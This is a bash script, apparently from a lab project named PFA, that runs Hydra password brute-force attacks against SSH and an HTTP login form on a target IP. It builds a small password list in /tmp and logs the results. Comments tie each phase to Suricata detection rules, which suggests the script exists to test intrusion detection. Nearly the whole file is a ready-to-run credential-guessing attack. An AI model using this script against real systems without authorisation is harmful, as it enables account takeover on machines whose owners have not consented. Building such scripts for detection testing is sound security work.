#!/bin/bash
# =============================================================================
# bruteforce.sh - Password Brute Force Suite (PFA)
# =============================================================================
# Maps to Suricata rule: sid:1000010 (SSH brute), sid:1000011 (HTTP brute)
# =============================================================================
TARGET="${1:-10.0.1.10}"
LOG_DIR="/opt/pfa/attacks/logs"
mkdir -p "$LOG_DIR"
REPORT="$LOG_DIR/bruteforce_$(date +%Y%m%d_%H%M%S).log"

echo "[*] PFA Brute Force Attack Suite" | tee "$REPORT"
echo "[*] Target: $TARGET" | tee -a "$REPORT"
echo "[*] Time: $(date -u)" | tee -a "$REPORT"
echo "" | tee -a "$REPORT"

# Create password list
PASSWD_FILE="/tmp/passwords.txt"
cat > "$PASSWD_FILE" << 'EOF'
admin
admin123
password
password123
root
toor
vulnpass123
123456
admin2024
PFA_Admin
EOF

# Phase 1: SSH brute force (triggers sid:1000010)
echo "[*] Phase 1: SSH Brute Force (Hydra)" | tee -a "$REPORT"
hydra -l admin -P "$PASSWD_FILE" -t 4 ssh://"$TARGET" 2>&1 | tee -a "$REPORT"

# Phase 2: HTTP form brute force (triggers sid:1000011)
echo "" | tee -a "$REPORT"
echo "[*] Phase 2: HTTP Login Brute Force (Hydra)" | tee -a "$REPORT"
hydra -l admin -P "$PASSWD_FILE" "$TARGET" http-post-form "/login.php:username=^USER^&password=^PASS^:F=Identifiants" -t 4 2>&1 | tee -a "$REPORT"

echo "" | tee -a "$REPORT"
echo "[*] Brute force complete. Report: $REPORT" | tee -a "$REPORT"
